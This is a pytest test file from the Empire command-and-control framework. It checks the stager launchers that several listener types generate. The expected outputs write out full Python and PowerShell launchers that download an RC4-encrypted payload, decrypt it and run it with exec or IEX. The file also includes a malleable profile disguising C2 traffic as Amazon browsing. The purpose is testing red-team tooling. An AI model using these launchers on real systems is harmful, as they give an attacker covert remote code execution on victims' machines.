from textwrap import dedent
from unittest.mock import MagicMock, Mock

import pytest

from empire.server.common import helpers


@pytest.fixture(scope="module", autouse=True)
def _setup_staging_key(session_local, models):
    with session_local.begin() as db:
        config = db.query(models.Config).first()
        config.staging_key = "@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}"


@pytest.fixture
def main_menu_mock(models):
    main_menu = Mock()
    main_menu.installPath = ""
    main_menu.listeners.activeListeners = {}
    main_menu.listeners.listeners = {}
    return main_menu


def test_http_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http.packets", packets)

    # guarantee the chosen stage0 url.
    random = MagicMock()
    random.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http.random", random)

    http_listener = Listener(main_menu_mock)

    http_listener.options["Cookie"]["Value"] = "l33th4x0r"
    http_listener.options["Host"]["Value"] = "http://localhost"
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_listener.options}
    }

    http_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_python_launcher()

    powershell_launcher = http_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_powershell_launcher()


def test_http_foreign_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http_foreign import Listener

    # guarantee the chosen stage0 url.
    random = MagicMock()
    random.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_foreign.random", random)

    http_foreign_listener = Listener(main_menu_mock)

    http_foreign_listener.options["Host"]["Value"] = "http://localhost"
    http_foreign_listener.options["RoutingPacket"]["Value"] = "cm91dGluZyBwYWNrZXQ="
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_foreign_listener.options}
    }

    http_foreign_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_foreign_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_foreign_python_launcher()

    powershell_launcher = http_foreign_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_foreign_powershell_launcher()


def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http_hop import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http_hop.packets", packets)

    # guarantee the chosen stage0 url.
    random = MagicMock()
    random.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_hop.random", random)

    http_hop_listener = Listener(main_menu_mock)

    http_hop_listener.options["Host"]["Value"] = "http://localhost"
    http_hop_listener.options["DefaultProfile"]["Value"] = (
        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    )
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_hop_listener.options}
    }

    http_hop_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_hop_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_hop_python_launcher()

    powershell_launcher = http_hop_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_hop_powershell_launcher()


def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http_malleable import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http_malleable.packets", packets)

    # guarantee the chosen stage0 url.
    random_mock = MagicMock()
    random_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http_malleable.random", random_mock)

    helpers_mock = MagicMock()
    helpers_mock.random_string.return_value = "r"
    monkeypatch.setattr("empire.server.listeners.http_malleable.helpers", helpers_mock)
    helpers_mock.obfuscate_call_home_address.side_effect = (
        helpers.obfuscate_call_home_address
    )

    session_mock = MagicMock()
    profile_mock = MagicMock()
    session_mock.return_value.query.return_value.filter.return_value.first.return_value = profile_mock
    profile_mock.data = _fake_malleable_profile()
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.SessionLocal", session_mock
    )

    http_malleable_listener = Listener(main_menu_mock)
    http_malleable_listener.options["Profile"]["Value"] = "amazon.profile"
    http_malleable_listener.validate_options()

    http_malleable_listener.options["Host"]["Value"] = "http://localhost"
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_malleable_listener.options}
    }

    http_malleable_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_malleable_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    # can't control the random characters in the url path, so just removing it from the comparison.
    python_launcher_start = python_launcher.find("http://localhost:80/")
    python_launcher_end = python_launcher_start + len("http://localhost:80/ckcivvgr/")
    python_launcher = (
        python_launcher[:python_launcher_start] + python_launcher[python_launcher_end:]
    )

    expected_python_launcher = _expected_http_malleable_python_launcher()
    expected_python_launcher_start = expected_python_launcher.find(
        "http://localhost:80/"
    )
    expected_python_launcher_end = expected_python_launcher_start + len(
        "http://localhost:80/ckcivvgr/"
    )
    expected_python_launcher = (
        expected_python_launcher[:expected_python_launcher_start]
        + expected_python_launcher[expected_python_launcher_end:]
    )

    assert python_launcher == expected_python_launcher

    powershell_launcher = http_malleable_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    powershell_launcher_start = powershell_launcher.find(")));$t=")
    powershell_launcher_end = powershell_launcher_start + len(")));$t='/fkcriywd/")
    powershell_launcher = (
        powershell_launcher[:powershell_launcher_start]
        + powershell_launcher[powershell_launcher_end:]
    )

    expected_powershell_launcher = _expected_http_malleable_powershell_launcher()
    expected_python_launcher_start = expected_powershell_launcher.find(")));$t=")
    expected_python_launcher_end = expected_python_launcher_start + len(
        ")));$t='/fkcriywd/"
    )
    expected_powershell_launcher = (
        expected_powershell_launcher[:expected_python_launcher_start]
        + expected_powershell_launcher[expected_python_launcher_end:]
    )

    assert powershell_launcher == expected_powershell_launcher


def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
    from empire.server.listeners.http import Listener as HttpListener
    from empire.server.listeners.port_forward_pivot import Listener

    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.port_forward_pivot.packets", packets)

    # guarantee the chosen stage0 url.
    random = MagicMock()
    random.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.port_forward_pivot.random", random)

    port_forward_pivot = Listener(main_menu_mock)

    # redirector doesn't get these fields until the listener is started.
    port_forward_pivot.options.update(HttpListener(main_menu_mock).options)
    port_forward_pivot.options["Host"] = {"Value": "http://localhost"}
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": port_forward_pivot.options}
    }

    port_forward_pivot.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = port_forward_pivot.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_redirector_python_launcher()

    powershell_launcher = port_forward_pivot.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_redirector_powershell_launcher()


def _expected_http_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""


def _expected_http_python_launcher():
    return dedent(
        """
        import sys;
        import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';
        req=urllib.request.Request(server+t);
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        o.addheaders=[('User-Agent',UA), ("Cookie", "l33th4x0r=cm91dGluZyBwYWNrZXQ=")];
        urllib.request.install_opener(o);
        a=urllib.request.urlopen(req).read();
        IV=a[0:4];
        data=a[4:];
        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
        S,j,out=list(range(256)),0,[];
        for i in list(range(256)):
            j=(j+S[i]+key[i%len(key)])%256;
            S[i],S[j]=S[j],S[i];
        i=j=0;
        for char in data:
            i=(i+1)%256;
            j=(j+S[i])%256;
            S[i],S[j]=S[j],S[i];
            out.append(chr(char^S[(S[i]+S[j])%256]));
        exec(''.join(out));
        """
    ).strip("\n")


def _expected_http_foreign_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""


def _expected_http_foreign_python_launcher():
    return dedent(
        """
        import sys;
        o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
        server='http://localhost';t='/admin/get.php';
        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
        import urllib.request;
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        urllib.request.install_opener(o);
        a=o.open(server+t).read();
        IV=a[0:4];
        data=a[4:];
        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
        S,j,out=list(range(256)),0,[];
        for i in list(range(256)):
            j=(j+S[i]+key[i%len(key)])%256;
            S[i],S[j]=S[j],S[i];
        i=j=0;
        for char in data:
            i=(i+1)%256;
            j=(j+S[i])%256;
            S[i],S[j]=S[j],S[i];
            out.append(chr(char^S[(S[i]+S[j])%256]));
        exec(''.join(out));
        """
    ).strip("\n")


def _expected_http_hop_python_launcher():
    return dedent(
        """
        import sys;
        import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';hop='fake_listener';
        req=urllib.request.Request(server+t);
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
        urllib.request.install_opener(o);
        a=urllib.request.urlopen(req).read();
        IV=a[0:4];
        data=a[4:];
        key=IV+''.encode('UTF-8');
        S,j,out=list(range(256)),0,[];
        for i in list(range(256)):
            j=(j+S[i]+key[i%len(key)])%256;
            S[i],S[j]=S[j],S[i];
        i=j=0;
        for char in data:
            i=(i+1)%256;
            j=(j+S[i])%256;
            S[i],S[j]=S[j],S[i];
            out.append(chr(char^S[(S[i]+S[j])%256]));
        exec(''.join(out));
    """
    ).strip("\n")


def _expected_http_hop_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""


def _expected_http_malleable_python_launcher():
    return dedent(
        """
        import sys,base64
        import urllib.request,urllib.parse
        server='http://localhost'
        proxy = urllib.request.ProxyHandler()
        o = urllib.request.build_opener(proxy)
        urllib.request.install_opener(o)
        vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})
        req=vreq('http://localhost:80/bcsjngnk/', )
        req.verb='GET'
        req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
        req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
        res=urllib.request.urlopen(req)
        a=res.read()
        a=urllib.request.urlopen(req).read();
        IV=a[0:4];
        data=a[4:];
        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
        S,j,out=list(range(256)),0,[];
        for i in list(range(256)):
            j=(j+S[i]+key[i%len(key)])%256;
            S[i],S[j]=S[j],S[i];
        i=j=0;
        for char in data:
            i=(i+1)%256;
            j=(j+S[i])%256;
            S[i],S[j]=S[j],S[i];
            out.append(chr(char^S[(S[i]+S[j])%256]));
        exec(''.join(out));
    """
    ).strip("\n")


def _expected_http_malleable_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/zxxuhptp/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..($data.length-1)];-join[Char[]](& $R $data ($IV+$K))|IEX"""


def _fake_malleable_profile():
    return """
        #
        # Amazon browsing traffic profile
        #
        # Author: @harmj0y
        #

        set sleeptime "5000";
        set jitter    "0";
        set maxdns    "255";
        set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

        http-get {

            set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";

            client {

                header "Accept" "*/*";
                header "Host" "www.amazon.com";

                metadata {
                    base64;
                    prepend "session-token=";
                    prepend "skin=noskin;";
                    append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
                    header "Cookie";
                }
            }

            server {

                header "Server" "Server";
                header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
                header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
                header "X-Frame-Options" "SAMEORIGIN";
                header "Content-Encoding" "gzip";

                output {
                    print;
                }
            }
        }

        http-post {

            set uri "/N4215/adj/amzn.us.sr.aps";

            client {

                header "Accept" "*/*";
                header "Content-Type" "text/xml";
                header "X-Requested-With" "XMLHttpRequest";
                header "Host" "www.amazon.com";

                parameter "sz" "160x600";
                parameter "oe" "oe=ISO-8859-1;";

                id {
                    parameter "sn";
                }

                parameter "s" "3717";
                parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

                output {
                    base64;
                    print;
                }
            }

            server {

                header "Server" "Server";
                header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
                header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
                header "X-Frame-Options" "SAMEORIGIN";
                header "x-ua-compatible" "IE=edge";

                output {
                    print;
                }
            }
        }
     """


def _expected_redirector_python_launcher():
    return dedent(
        """
        import sys;import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';req=urllib.request.Request(server+t);
        req.add_header('User-Agent',UA);
        req.add_header('Cookie',"session=cm91dGluZyBwYWNrZXQ=");
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        urllib.request.install_opener(o);
        a=urllib.request.urlopen(req).read();
        IV=a[0:4];
        data=a[4:];
        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
        S,j,out=list(range(256)),0,[];
        for i in list(range(256)):
            j=(j+S[i]+key[i%len(key)])%256;
            S[i],S[j]=S[j],S[i];
        i=j=0;
        for char in data:
            i=(i+1)%256;
            j=(j+S[i])%256;
            S[i],S[j]=S[j],S[i];
            out.append(chr(char^S[(S[i]+S[j])%256]));
        exec(''.join(out));
    """
    ).strip("\n")


def _expected_redirector_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
